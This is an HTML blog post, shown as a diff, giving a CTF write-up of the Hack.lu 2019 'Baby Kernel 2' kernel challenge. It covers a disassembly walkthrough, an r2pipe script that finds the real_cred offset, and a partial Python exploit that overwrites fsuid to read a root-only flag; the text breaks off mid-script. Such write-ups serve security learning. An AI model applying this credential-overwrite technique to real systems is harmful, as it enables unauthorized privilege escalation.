@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang=en> <head><title>Hack.lu 2019 - Baby Kernel 2 writeup</title><meta charset=UTF-8><meta name=viewport content="width=device-width"><link rel=stylesheet type=text/css href=/static/css/style.css><link rel=stylesheet type=text/css href=/static/css/native.css></head> <body> <main> <nav> <ul> <li><a href=/ >&gt; index</a></li> <li><a href=/b>&gt; blog</a></li> <li><a href=https://github.com/xarkes>&gt; git</a></li> <li><a href=https://twitter.com/xarkes_>&gt; twitter</a></li> </ul> </nav> <article> <h1><a href=/b/hacklu-2019-babykernel-wu.html>Hack.lu 2019 - Baby Kernel 2 writeup</a></h1> <p class=meta>Published on 2019-12-09</p> <p>Last october, I participated to <a href=https://2019.hack.lu/ >Hack.lu</a> Capture The Flag with my team <a href=https://securimag.org/ >Securimag</a>.</p> <p>I did this writeup as all the ones I've read do not explain how they managed to reliably find the offset of <code>real_cred</code> in the <code>current_task</code> structure.</p> <p>I didn't have much time to allocate for that challenge, and as I'm interested in exploitation, I quickly jumped on "Baby Kernel 2" as it was marked as easy and dealing with kernels.</p> <h2>Overview</h2> <p>The challenge provides a <a href=/files/baby_kernel_2.zip>ZIP archive</a> that contains multiple files:</p> <ul> <li><code>vmlinux</code> - A <a href=https://en.wikipedia.org/wiki/Vmlinux>linux kernel</a></li> <li><code>System.map</code> - The symbols location for that kernel</li> <li><code>initramfs.cpio.gz</code> - The initial root filesystem</li> <li><code>bzImage</code> - Contains the bootloader and the stripped and compressed kernel</li> <li><code>run.sh</code> - A script to run the kernel with qemu</li> </ul> <p>Note: In the archive I provide, I removed <code>vmlinux</code> as it is quite heavy and unecessary because <code>System.map</code> is given as well.</p> <p>It is possible to extract the kernel from <code>bzImage</code> by using the <a href=https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux>extract-vmlinux</a> script from the linux kernel source code. Otherwise, <a href=https://github.com/ReFirmLabs/binwalk>binwalk</a> will manage to extract it as well:</p> <div class=codehilite><pre><span></span><span class=c1># Extract with extract-vmlinux</span>
+./extract-vmlinux ./bzImage &gt; vmlinux
+<span class=c1># Extract with binwalk</span>
+binwalk -e ./bzImage
+</pre></div> <p>Let's run it to see what it looks like:</p> <div class=codehilite><pre><span></span><span class=p>.</span><span class=o>/</span><span class=n>run</span><span class=p>.</span><span class=n>sh</span>
+
+<span class=p>...</span>
+
+<span class=c1>----- Menu -----</span>
+<span class=mi>1</span><span class=p>.</span> <span class=k>Read</span>
+<span class=mi>2</span><span class=p>.</span> <span class=k>Write</span>
+<span class=mi>3</span><span class=p>.</span> <span class=k>Show</span> <span class=n>me</span> <span class=n>my</span> <span class=n>uid</span>
+<span class=mi>4</span><span class=p>.</span> <span class=k>Read</span> <span class=n>file</span>
+<span class=mi>5</span><span class=p>.</span> <span class=k>Any</span> <span class=n>hintz</span><span class=o>?</span>
+<span class=mi>6</span><span class=p>.</span> <span class=n>Bye</span><span class=o>!</span>
+<span class=o>&gt;</span>
+</pre></div> <p>Right after the linux VM booted, there's not shell to greet us, but only a small program that asks us do to an action.</p> <h2>Understanding everything</h2> <p>Since I was not doing the CTF to win, but rather just for fun, I decided to take the time to understand everything.</p> <p>First of all, I decided to extract the default file system to see what was available on the system. To do so I used the following commands:</p> <div class=codehilite><pre><span></span>$ mkdir root
+$ <span class=nb>cd</span> root
+$ cp ../initramfs.cpio.gz ./
+$ gunzip ./initramfs.cpio.gz
+$ cpio -id &lt; ./initramfs.cpio
+<span class=m>7393</span> blocks
+$ ls
+bin  client_kernel_baby_2  etc  flag  home  init  initramfs.cpio  lib  proc  root  sys  usr  var
+$
+</pre></div> <p>Now to understand what was this program that was ran during startup, I read the <code>init</code> file. There are many lines, but more importantly:</p> <div class=codehilite><pre><span></span>chmod <span class=m>700</span> /flag
+mkdir -p /lib/modules/<span class=k>$(</span>uname -r<span class=k>)</span>
+insmod <span class=s2>&quot;/lib/modules/</span><span class=k>$(</span>uname -r<span class=k>)</span><span class=s2>/kernel_baby_2.ko&quot;</span>
+chmod +rw /dev/flux_baby_2
+chmod +x /client_kernel_baby_2
+sleep <span class=m>2</span>
+su user -c /client_kernel_baby_2
+</pre></div> <ol> <li>During <a href=https://en.wikipedia.org/wiki/Linux_startup_process#Init_process>init</a> the file <code>/flag</code> is set to read, write and execute permissions for user <code>root</code> only.</li> <li>A kernel module is loaded</li> <li>The file <code>/client_kernel_baby_2</code> is set as executable, and is started with the user named <code>user</code>.</li> </ol> <h3>The client</h3> <p>Quickly, I decided to check what the client file does. In fact, I was intrigued as the challenge was supposed to be an easy kernel exploitation, but here only a userland application was available.</p> <p>The binary is not stripped, and we can quickly understand what is happening. Using <a href=https://github.com/radareorg/radare2>radare2</a>, I quickly disassembled the program to understand what it does. As we've seen above, there are 6 actions available and 3 to 6 do what they mean to do.</p> <ul> <li>The command <code>3</code> will call <code>system("id");</code></li> <li>The command <code>4</code> will read try to open <code>/flag</code> and read its content.</li> <li>The command <code>5</code> will print a hint.</li> <li>The command <code>6</code> will exit the program, that will cause the system to halt.</li> </ul> <p>So nothing suprising from here, but what do <code>1</code> and <code>2</code> do exactly? There are two unstripped functions in the binary that are named <code>do_read</code> and <code>do_write</code>. And what do they do? They trigger an <a href=http://man7.org/linux/man-pages/man2/ioctl.2.html>ioctl</a> (request 901 for the read function, request 902 for the write function) with the given parameters that are read from the user input.</p> <p>Alright, so I think it's time to disassemble the kernel module.</p> <h3>The kernel module</h3> <p>The kernel module is rather small, and not stripped. We can spot the function <code>driver_ioctl</code> and inspect it. It will compare the first argument with 901 and 902 and if it matches any it will either call the function <code>read</code> or <code>_copy_from_user</code> respectively with the arguments from the user.</p> <p>The function <code>read</code> will use <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re256.html>copy_to_user</a> to read data from the kernel to userland, and <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re257.html>copy_from_user</a> is used to copy data from userland (our input program) into the kernel.</p> <p>So now it's becoming clearer that we can interact with kernel land through the provided program.</p> <h2>Exploitation</h2> <p>So, the goal of the challenge is to read the <code>/flag</code> file, but as we've seen earlier, it is readable for user <code>root</code> only. How can we do that? Well I think there are multiple ways of doing it, but here is the way I chose. Since it's not necessary to pop a shell or anything too complicated, the only goal of the challenge is to elevate the privileges of the current process to <code>root</code>.</p> <p>Usually it is possible to do so by calling <code>commit_creds(prepare_kernel_cred(0));</code>. In our context all we can do is read and write some kernel space memory. So let's see what the <a href=https://elixir.bootlin.com/linux/v4.19.77/source/kernel/cred.c#L427>commit_creds</a> function do.</p> <div class=codehilite><pre><span></span><span class=kt>int</span> <span class=nf>commit_creds</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span> <span class=o>*</span><span class=n>new</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=n>task</span> <span class=o>=</span> <span class=n>current</span><span class=p>;</span>
+    <span class=k>const</span> <span class=k>struct</span> <span class=n>cred</span> <span class=o>*</span><span class=n>old</span> <span class=o>=</span> <span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>;</span>
+
+    <span class=cm>/* ... */</span>
+
+    <span class=n>rcu_assign_pointer</span><span class=p>(</span><span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>,</span> <span class=n>new</span><span class=p>);</span>
+    <span class=n>rcu_assign_pointer</span><span class=p>(</span><span class=n>task</span><span class=o>-&gt;</span><span class=n>cred</span><span class=p>,</span> <span class=n>new</span><span class=p>);</span>
+
+    <span class=cm>/* ... */</span>
+
+    <span class=cm>/* release the old obj and subj refs both */</span>
+    <span class=n>put_cred</span><span class=p>(</span><span class=n>old</span><span class=p>);</span>
+    <span class=n>put_cred</span><span class=p>(</span><span class=n>old</span><span class=p>);</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</pre></div> <p>The linux kernel provides a macro <a href=https://elixir.bootlin.com/linux/v4.19.77/source/arch/x86/include/asm/current.h#L18>current</a> also known as <code>struct task_struct *current_task</code> that is a pointer to the currently executed process.</p> <p>Here the function <code>commit_creds</code> just updates the <code>current-&gt;real_cred</code> and <code>current-&gt;cred</code> pointers to the new credentials.</p> <p>The <a href="">task_struct</a> structure is quite big, but has indeed the <code>real_cred</code> and <code>cred</code> members:</p> <div class=codehilite><pre><span></span><span class=k>struct</span> <span class=n>task_struct</span> <span class=p>{</span>
+    <span class=cm>/* ... */</span>
+
+    <span class=cm>/* Process credentials: */</span>
+    <span class=cm>/* Tracer&#39;s credentials at attach: */</span>
+    <span class=k>const</span> <span class=k>struct</span> <span class=n>cred</span> <span class=n>__rcu</span>     <span class=o>*</span><span class=n>ptracer_cred</span><span class=p>;</span>
+    <span class=cm>/* Objective and real subjective task credentials (COW): */</span>
+    <span class=k>const</span> <span class=k>struct</span> <span class=n>cred</span> <span class=n>__rcu</span>     <span class=o>*</span><span class=n>real_cred</span><span class=p>;</span>
+    <span class=cm>/* Effective (overridable) subjective task credentials (COW): */</span>
+    <span class=k>const</span> <span class=k>struct</span> <span class=n>cred</span> <span class=n>__rcu</span>     <span class=o>*</span><span class=n>cred</span><span class=p>;</span>
+
+    <span class=cm>/* ... */</span>
+<span class=p>};</span>
+</pre></div> <p>The <a href=https://elixir.bootlin.com/linux/v4.19.77/source/include/linux/cred.h#L116>cred</a> structure looks as follows:</p> <div class=codehilite><pre><span></span><span class=k>struct</span> <span class=n>cred</span> <span class=p>{</span>
+    <span class=n>atomic_t</span>    <span class=n>usage</span><span class=p>;</span>
+<span class=cp>#ifdef CONFIG_DEBUG_CREDENTIALS</span>
+    <span class=n>atomic_t</span>    <span class=n>subscribers</span><span class=p>;</span>    <span class=cm>/* number of processes subscribed */</span>
+    <span class=kt>void</span>        <span class=o>*</span><span class=n>put_addr</span><span class=p>;</span>
+    <span class=kt>unsigned</span>    <span class=n>magic</span><span class=p>;</span>
+<span class=cp>#define CRED_MAGIC  0x43736564</span>
+<span class=cp>#define CRED_MAGIC_DEAD 0x44656144</span>
+<span class=cp>#endif</span>
+    <span class=n>kuid_t</span>      <span class=n>uid</span><span class=p>;</span>        <span class=cm>/* real UID of the task */</span>
+    <span class=n>kgid_t</span>      <span class=n>gid</span><span class=p>;</span>        <span class=cm>/* real GID of the task */</span>
+    <span class=n>kuid_t</span>      <span class=n>suid</span><span class=p>;</span>       <span class=cm>/* saved UID of the task */</span>
+    <span class=n>kgid_t</span>      <span class=n>sgid</span><span class=p>;</span>       <span class=cm>/* saved GID of the task */</span>
+    <span class=n>kuid_t</span>      <span class=n>euid</span><span class=p>;</span>       <span class=cm>/* effective UID of the task */</span>
+    <span class=n>kgid_t</span>      <span class=n>egid</span><span class=p>;</span>       <span class=cm>/* effective GID of the task */</span>
+    <span class=n>kuid_t</span>      <span class=n>fsuid</span><span class=p>;</span>      <span class=cm>/* UID for VFS ops */</span>
+    <span class=n>kgid_t</span>      <span class=n>fsgid</span><span class=p>;</span>      <span class=cm>/* GID for VFS ops */</span>
+    <span class=kt>unsigned</span>    <span class=n>securebits</span><span class=p>;</span> <span class=cm>/* SUID-less security management */</span>
+    <span class=n>kernel_cap_t</span>    <span class=n>cap_inheritable</span><span class=p>;</span> <span class=cm>/* caps our children can inherit */</span>
+    <span class=n>kernel_cap_t</span>    <span class=n>cap_permitted</span><span class=p>;</span>  <span class=cm>/* caps we&#39;re permitted */</span>
+    <span class=n>kernel_cap_t</span>    <span class=n>cap_effective</span><span class=p>;</span>  <span class=cm>/* caps we can actually use */</span>
+    <span class=n>kernel_cap_t</span>    <span class=n>cap_bset</span><span class=p>;</span>   <span class=cm>/* capability bounding set */</span>
+    <span class=n>kernel_cap_t</span>    <span class=n>cap_ambient</span><span class=p>;</span>    <span class=cm>/* Ambient capability set */</span>
+<span class=cp>#ifdef CONFIG_KEYS</span>
+    <span class=kt>unsigned</span> <span class=kt>char</span>   <span class=n>jit_keyring</span><span class=p>;</span>    <span class=cm>/* default keyring to attach requested</span>
+<span class=cm>                     * keys to */</span>
+    <span class=k>struct</span> <span class=n>key</span> <span class=n>__rcu</span> <span class=o>*</span><span class=n>session_keyring</span><span class=p>;</span> <span class=cm>/* keyring inherited over fork */</span>
+    <span class=k>struct</span> <span class=n>key</span>  <span class=o>*</span><span class=n>process_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this process */</span>
+    <span class=k>struct</span> <span class=n>key</span>  <span class=o>*</span><span class=n>thread_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this thread */</span>
+    <span class=k>struct</span> <span class=n>key</span>  <span class=o>*</span><span class=n>request_key_auth</span><span class=p>;</span> <span class=cm>/* assumed request_key authority */</span>
+<span class=cp>#endif</span>
+<span class=cp>#ifdef CONFIG_SECURITY</span>
+    <span class=kt>void</span>        <span class=o>*</span><span class=n>security</span><span class=p>;</span>  <span class=cm>/* subjective LSM security */</span>
+<span class=cp>#endif</span>
+    <span class=k>struct</span> <span class=n>user_struct</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span>   <span class=cm>/* real user ID subscription */</span>
+    <span class=k>struct</span> <span class=n>user_namespace</span> <span class=o>*</span><span class=n>user_ns</span><span class=p>;</span> <span class=cm>/* user_ns the caps and keyrings are relative to. */</span>
+    <span class=k>struct</span> <span class=n>group_info</span> <span class=o>*</span><span class=n>group_info</span><span class=p>;</span>  <span class=cm>/* supplementary groups for euid/fsgid */</span>
+    <span class=cm>/* RCU deletion */</span>
+    <span class=k>union</span> <span class=p>{</span>
+        <span class=kt>int</span> <span class=n>non_rcu</span><span class=p>;</span>            <span class=cm>/* Can we skip RCU deletion? */</span>
+        <span class=k>struct</span> <span class=n>rcu_head</span> <span class=n>rcu</span><span class=p>;</span>        <span class=cm>/* RCU deletion hook */</span>
+    <span class=p>};</span>
+<span class=p>}</span> <span class=n>__randomize_layout</span><span class=p>;</span>
+</pre></div> <p>In the end, what we can do is just to overwrite most of the <code>real_cred</code> structure members to update the user id and group id to 0 (root) until we can manage to read the flag. In fact, it is only necessary to update the <code>fsuid</code> field as it is the one that will be checked when accessing a file on the filesystem.</p> <p>Once we understood all of this, we have to find where those fields are located in the memory. Luckily, we were provided the <code>System.map</code> file that contains all the symbols we need. In the original archive, <code>vmlinux</code> was also provided and already contained all those symbols. The first action that is done in the <code>commit_creds</code> function is to dereference the <code>current_task</code> and access the <code>real_cred</code> member.</p> <div class=codehilite><pre><span></span><span class=kt>int</span> <span class=nf>commit_creds</span><span class=p>(</span><span class=k>struct</span> <span class=n>cred</span> <span class=o>*</span><span class=n>new</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=n>task</span> <span class=o>=</span> <span class=n>current</span><span class=p>;</span>
+    <span class=k>const</span> <span class=k>struct</span> <span class=n>cred</span> <span class=o>*</span><span class=n>old</span> <span class=o>=</span> <span class=n>task</span><span class=o>-&gt;</span><span class=n>real_cred</span><span class=p>;</span>
+    <span class=cm>/* ... */</span>
+</pre></div> <p>We can retrieve the offset for <code>commit_creds</code> with a single <code>grep</code> command:</p> <div class=codehilite><pre><span></span>$ grep commit_creds ./System.map
+ffffffff81050c50 T commit_creds
+ffffffff816d4c80 r __ksymtab_commit_creds
+ffffffff816dc9b2 r __kstrtab_commit_creds
+</pre></div> <p>And now check the disassembly inside radare2:</p> <div class=codehilite><pre><span></span><span class=nf>$</span> <span class=nv>r2</span> <span class=nv>.</span><span class=o>/</span><span class=nv>vmlinux</span>
+<span class=err>[0</span><span class=nf>x01000000</span><span class=p>]</span><span class=o>&gt;</span> <span class=nv>s</span> <span class=mh>0xffffffff81050c50</span>
+<span class=err>[0</span><span class=nf>xffffffff81050c50</span><span class=p>]</span><span class=o>&gt;</span> <span class=nv>pd</span> <span class=mi>10</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c50</span>      <span class=mi>55</span>             <span class=nv>push</span> <span class=nb>rbp</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c51</span>      <span class=mi>4889</span><span class=nv>e5</span>         <span class=nv>mov</span> <span class=nb>rbp</span><span class=p>,</span> <span class=nb>rsp</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c54</span>      <span class=mi>4155</span>           <span class=nv>push</span> <span class=nv>r13</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c56</span>      <span class=mi>4</span><span class=nv>c8b2c2540a0.</span>  <span class=nv>mov</span> <span class=nv>r13</span><span class=p>,</span> <span class=kt>qword</span> <span class=p>[</span><span class=mh>0xffffffff8183a040</span><span class=p>]</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c5e</span>      <span class=mi>4154</span>           <span class=nv>push</span> <span class=nv>r12</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c60</span>      <span class=mi>53</span>             <span class=nv>push</span> <span class=nb>rbx</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c61</span>      <span class=mi>4</span><span class=nv>d8ba5f80300.</span>  <span class=nv>mov</span> <span class=nv>r12</span><span class=p>,</span> <span class=kt>qword</span> <span class=p>[</span><span class=nv>r13</span> <span class=o>+</span> <span class=mh>0x3f8</span><span class=p>]</span>
+      <span class=err>0</span><span class=nf>xffffffff81050c68</span>      <span class=mi>4</span><span class=nv>d39a5000400.</span>  <span class=nv>cmp</span> <span class=kt>qword</span> <span class=p>[</span><span class=nv>r13</span> <span class=o>+</span> <span class=mh>0x400</span><span class=p>],</span> <span class=nv>r12</span>
+  <span class=err>,=&lt;</span> <span class=err>0</span><span class=nf>xffffffff81050c6f</span>      <span class=mi>0</span><span class=nv>f85f1000000</span>   <span class=nv>jne</span> <span class=mh>0xffffffff81050d66</span>
+  <span class=err>|</span>   <span class=err>0</span><span class=nf>xffffffff81050c75</span>      <span class=mi>8</span><span class=nv>b07</span>           <span class=nv>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>rdi</span><span class=p>]</span>
+</pre></div> <p>As we can see the <code>current_task</code> pointer is dereferenced with the offset <code>0x3f8</code>, so this corresponds to the <code>real_cred</code> pointer. It is possible to automate this process with the following python script:</p> <div class=codehilite><pre><span></span><span class=kn>import</span> <span class=nn>r2pipe</span>
+
+<span class=n>r2</span> <span class=o>=</span> <span class=n>r2pipe</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;./vmlinux&#39;</span><span class=p>)</span>
+<span class=n>r2</span><span class=o>.</span><span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;s sym.commit_creds&#39;</span><span class=p>)</span>
+<span class=n>r2</span><span class=o>.</span><span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;aei; aeim&#39;</span><span class=p>)</span>
+<span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>):</span>
+    <span class=c1># Step instruction per instruction</span>
+    <span class=n>r2</span><span class=o>.</span><span class=n>cmd</span><span class=p>(</span><span class=s1>&#39;aes&#39;</span><span class=p>)</span>
+    <span class=n>op</span> <span class=o>=</span> <span class=n>r2</span><span class=o>.</span><span class=n>cmdj</span><span class=p>(</span><span class=s1>&#39;aoj 1 @ PC&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+    <span class=c1># Check for memory dereference</span>
+    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=mi>2</span> <span class=ow>and</span> <span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;mem&#39;</span><span class=p>:</span>
+        <span class=c1># Get reg that contains the struct pointer</span>
+        <span class=k>if</span> <span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=s1>&#39;disp&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=n>current_task_addr</span><span class=p>:</span>
+            <span class=n>usedreg</span> <span class=o>=</span> <span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>][</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;value&#39;</span><span class=p>]</span>
+            <span class=k>continue</span>
+        <span class=c1># If reg base is current_task, then get the offset</span>
+        <span class=k>if</span> <span class=s1>&#39;base&#39;</span> <span class=ow>in</span> <span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=ow>and</span> <span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=s1>&#39;base&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=n>usedreg</span><span class=p>:</span>
+            <span class=n>real_cred_offset</span> <span class=o>=</span> <span class=n>op</span><span class=p>[</span><span class=s1>&#39;opex&#39;</span><span class=p>][</span><span class=s1>&#39;operands&#39;</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=s1>&#39;disp&#39;</span><span class=p>]</span>
+            <span class=k>break</span>
+<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>real_cred_offset</span><span class=p>))</span>
+<span class=n>r2</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
+</pre></div> <p>And it will print this offset as well! That's the only reliable way I found to quickly compute the right offset for <code>real_cred</code>, as it may vary from kernel versions and compilation options.</p> <p>Now using either the <code>vmlinux</code> file (which already contains symbols) or the <code>System.map</code> file, we can get the address of <code>current_task</code>.</p> <p>The exploit will be as follow:</p> <ol> <li>Get <code>current_task</code> pointer</li> <li>Get <code>current-&gt;real_cred</code> pointer</li> <li>Overwrite <code>current-&gt;real_cred-&gt;fsuid</code> to 0</li> <li>Print the flag</li> </ol> <p>As the initial challenge is done remotely, it's possible to make our local script act as a remote target. I use the following trick thanks to socat:</p> <div class=codehilite><pre><span></span>socat tcp-l:1337,reuseaddr,fork exec:<span class=s2>&quot;bash -c ./run.sh&quot;</span>
+</pre></div> <p>And we can create the following exploit:</p> <div class=codehilite><pre><span></span><span class=ch>#!/usr/bin/env python</span>
+
+<span class=kn>import</span> <span class=nn>socket</span>
+<span class=kn>import</span> <span class=nn>telnetlib</span>
+<span class=kn>import</span> <span class=nn>r2pipe</span>
+
+
+<span class=k>class</span> <span class=nc>Socket</span><span class=p>():</span>
+    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
+        <span class=bp>self</span><span class=o>.</span><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
+
+    <span class=k>def</span> <span class=nf>recv</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span> <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
+
+    <span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span> <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
+
+    <span class=k>def</span> <span class=nf>recv_until</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span>
+        <span class=n>data</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
+        <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>d</span><span class=p>)</span> <span class=o>==</span> <span class=nb>type</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
+            <span class=n>d</span> <span class=o>=</span> <span class=n>d</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+        <span class=k>while</span> <span class=ow>not</span> <span class=n>data</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=n>d</span><span class=p>):</span>
+            <span class=n>tmp</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+            <span class=k>if</span> <span class=ow>not</span> <span class=n>tmp</span><span class=p>:</span>
+                <span class=k>break</span>
+            <span class=n>data</span> <span class=o>+=</span> <span class=n>tmp</span>
+        <span class=k>return</span> <span class=n>data</span>
+
+    <span class=k>def</span> <span class=nf>recv_all</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+        <span class=n>data</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
+        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+            <span class=n>part</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
+            <span class=n>data</span> <span class=o>+=</span> <span class=n>part</span>
+            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>part</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>4096</span><span class=p>:</span>
+                <span class=k>break</span>
+        <span class=k>return</span> <span class=n>data</span>
+
+    <span class=k>def</span> <span class=nf>interact</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+        <span class=n>t</span> <span class=o>=</span> <span class=n>telnetlib</span><span class=o>.</span><span class=n>Telnet</span><span class=p>()</span>
+        <span class=n>t</span><span class=o>.</span><span class=n>sock</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>s</span>
+        <span class=n>t</span><span class=o>.</span><span class=n>interact</span><span class=p>()</span>
+
+
+<span class=k>def</span> <span class=nf>plog</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[+] &#39;</span> <span class=o>+</span> <span class=n>m</span><span class=p>)</span>
+
+
+<span class=c1># Get symbols info from System.map</span>
+<span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./public/System.map&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>):</span>
+    <span class=k>if</span> <span class=s1>&#39;D current_task&#39;</span> <span class=ow>in</span> <span class=n>l</span><span class=p>:</span>
+        <span class=n>current_task_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>l</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+<span class=n>current_task_addr</span> <span class=o>=</span> <span class=mh>0xffffffff8183a040</span>
+<span class=n>real_cred_offset</span> <span class=o>=</span> <span class=mh>0x3f8</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;Found current_task: 0x</span><span class=si>{:x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>current_task_addr</span><span class=p>))</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;Found real_cred_offset: 0x</span><span class=si>{:x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>real_cred_offset</span><span class=p>))</span>
+
+
+<span class=c1>#############</span>
+<span class=c1># Exploit it!</span>
+<span class=nb>print</span><span class=p>(</span><span class=s1>&#39;-------------------&#39;</span><span class=p>)</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;Connecting to remote VM...&#39;</span><span class=p>)</span>
+<span class=n>s</span> <span class=o>=</span> <span class=n>Socket</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+<span class=n>plog</span><span class=p>(</span><span class=s1>&#39;VM Started!&#39;</span><span class=p>)</span>
+
+<span class=c1># 1. Get current_task_ptr</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+<span class=n>s</span><span class=o>.</span><span class=n>recv_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+<span class=n>pl</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>current_task_addr</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+<span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>pl</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
